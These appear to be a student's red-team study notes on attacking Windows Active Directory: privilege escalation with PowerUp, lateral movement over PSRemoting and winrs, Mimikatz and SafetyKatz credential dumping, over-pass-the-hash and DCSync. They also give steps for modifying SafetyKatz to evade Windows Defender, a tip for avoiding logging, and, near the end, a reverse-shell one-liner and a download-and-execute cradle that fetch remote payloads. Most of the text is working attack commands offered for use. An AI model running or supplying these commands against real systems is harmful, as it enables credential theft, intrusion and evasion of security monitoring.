
There are various ways of locally escalating privileges on Windows box:

- Missing Patches
- Automated deployment and AutoLogon passwords in clear text
- AlwaysInstallElevated
- Misconfigured and more
- DLL Hijacking and more
- NTLM Relaying 


#### Services issues using PowerUp

Get services with unquoted paths and a space in their name

~~~
Get-ServiceUnquoted -verbose
~~~


Get services where the current user can write to this binary path or change arguments to the binary 

~~~
Get-ModifiableService -verbose
~~~

 command for add the current user using the vuln
 
~~~
Invoke_ServiceAbuse -Name 'AbyssWebServer' -UserName dcorp\student566 -Verbose
~~~


Refrence:
 
`https://medium.com/r3d-buck3t/privilege-escalation-with-insecure-windows-service-permissions-5d97312db107`

Get the service whose configuration current user can modify

~~~
Get-ModifiableService -verbose
~~~

To find the pathname of the service running

~~~
Get-WmiObject -Class win32_service | select pathname
~~~

PowerUp

~~~
Invoke-AllChecks
~~~

Privesc

~~~
Invoke-PeivEsc
~~~

PEASS-ng

~~~
winPEAS.exe
~~~


##   Lateral Movement - Powershell Remoting

- Think of PowerShell Remoting (PSRemoting) as psexec on steroids but much more silent and super fast!
- PSRemoting uses Windows Remote Management (WinRM) which is Microsoft’s implementation of WS-Management.
- Enabled by default on Server 2012 onwards with a firewall exception.
- Uses WinRM and listens by default on 5985 (HTTP) and 5986 (HTTPS).
- It is the recommended way to manage Windows Core servers.
- You may need to enable remoting (Enable-PSRemoting) on a Desktop Windows machine, Admin privs are required to do that.
- The remoting process runs as a high integrity process. That is, you get an elevated shell.

   1. One to one
   2. PSSession
       - Interactive
       - Runs in a mew process
       - Is Stateful
   3. Useful cmdlets
      - New-PSSession
      - Enter-PSSession


Open a powershell window with admin privilege

~~~
Enable-PSRemoting
~~~

 To get the interactive shell
  
~~~
Enter-PSSseion -ComputerName dcorp-adminstry
~~~

Use below to execute commands or scriptblocks

~~~
Invoke-Command -Scriptblock {Get-Process} -ComputerName (Get-Content "<list_of servers>")
~~~

Use below to execute locally loaded function on the remote machines:

~~~
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>)
~~~

In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way

~~~
Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content <list_of_servers>) -ArgumentList
~~~

**In below, a function call within the script is used**:

~~~
Invoke-Command -Filepath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content <list_of_servers>)
~~~


Use below to execute Stateful commands using Invoke-Command:

~~~
$Sess = New-PSSession -Computername Server1
Invoke-Command -Session $Sess -ScriptBlock {$Proc = Get-Process}
Invoke-Command -Session $Sess -ScriptBlock {$Proc.Name}
~~~


We can use winrs in place of PSRemoting to evade the logging (and still reap the benefit of 5985 allowed between hosts):

~~~
winrs -remote:server1 -u:server1\administrator -p:Pass@1234 hostname
~~~

## Invoke-Mimikatz

Frist command for know peivilege

~~~
privilege::debug
~~~

ensure that the output is "Privilege '20' ok"


Dump the logon passwords

~~~
sekurlsa:logonpasswords
~~~

Local Security Authority Subsystem Service (LSASS)

 dump the content from the sam database
  
~~~
lsadump::sam
~~~


dump the hashes with patch 

~~~
lsadump::lsa /patch
~~~


Dump credentials on  a local machine

~~~
Invoke-Mimikatz -command ' "sekurlsa::ekeys" '
~~~

Using safetyKatz (Minidump of lsass and PELoader to run Mimikatz)

~~~
safetykatz.exe "sekurlsa::ekeys"
~~~

### Over Pass The Hash

Over Pass the hash (OPTH) generate tokens from hashes or keys.


~~~
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:us.techcorp.local /aes256:<aes256key> /run:powershell.exe"' 
~~~

~~~
SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:us.techcorp.local /aes256:<aes256keys> /run:cmd.exe" "exit"
~~~

The above commands starts a PowerShell session with a logon type 9 (same as runas /netonly).

### DCSync

Domain Admins privileges are required to run DCSync

To extract credentials from the DC without code execution on it, we can use DCSync.

To use the DCSync feature for getting krbtgt hash execute the below command with DA privileges for us domain:

~~~
Invoke-Mimikatz -Command '"lsadump::dcsync /user:us\krbtgt"'
~~~

~~~
SafetyKatz.exe "lsadump::dcsync /user:us\krbtgt" "exit"
~~~

Refrence:https://freedium.cfd/https://pswalia2u.medium.com/active-directory-attack-paths-with-exploitation-will-be-updated-as-i-learn-more-b23b5cfdae10

### Offensive .NET

####  Tradecraft - AV bypass

For that, we can use techniques like Obfuscation, String Manipulation etc

DefenderCheck

`https://github.com/matterpreter/DefenderCheck`

To identify code and strings from a binary that Windows Defender may flag.


Let’s check SharpKatz.exe for signatures using DefenderCheck

~~~
DefenderCheck.exe <Path to Sharpkatz binary>
~~~

- Open the project in Visual Studio.
- Press **CTRL + H**
- Find and replace the string “Credentials” with “Credents” you can use any other string as an replacement. (Make sure that string is not present in the code)
- Select the scope as **Entire Solution**.
- Press **Replace All** button.
- Build and recheck the binary with _DefenderCheck_.
- Repeat above steps if still there is detection


Run the Out-CompressedDll.ps1 PowerShell script on Mimikatz binary and save the output to a file

Out-CompressedDll.ps1

`https://github.com/PowerShellMafia/PowerSploit/blob/master/ScriptModification/Out-CompressedDll.ps1`

~~~
Out-CompressedDll <Path to mimikatz.exe> > 	outputfilename.txt
~~~

- Copy the value of the variable **$EncodedCompressedFile** from the output file above and replace the value of **compressedMimikatzString** variable in the **Constants.cs** file of SafetyKatz.
    
- Copy the byte size from the output file and replace it in **Program.cs** file on the line 111 & 116.
- Build and recheck the binary with _DefenderCheck_

![[Pasted image 20241121223521.png]]

- Download the latest release of “mimikatz_trunk.zip” file.
- Convert the file to base64 value
Modify the **Program.cs** file.

Added a new variable that contains the base64 value of **mimikatz_trunk.zip** file. – Comment the code that downloads or accepts the mimikatz file as an argument. – Convert the base64 string to bytes and pass it to **zipStream** variable







~~~
powershell iex (iwr -UseBasicParsing http://ip/Invoke-PowerShellTcp.ps1);power -Reverse -IPAddress ip -Port 433
~~~


Command for Bloodhound

~~~
Invoke-BloodHound -Collection All -Verbose
~~~

 Download execute cradle 

~~~
iex (New-Object Net.Webclient).DownloadString('htttps://webserver/payload.ps1')
~~~



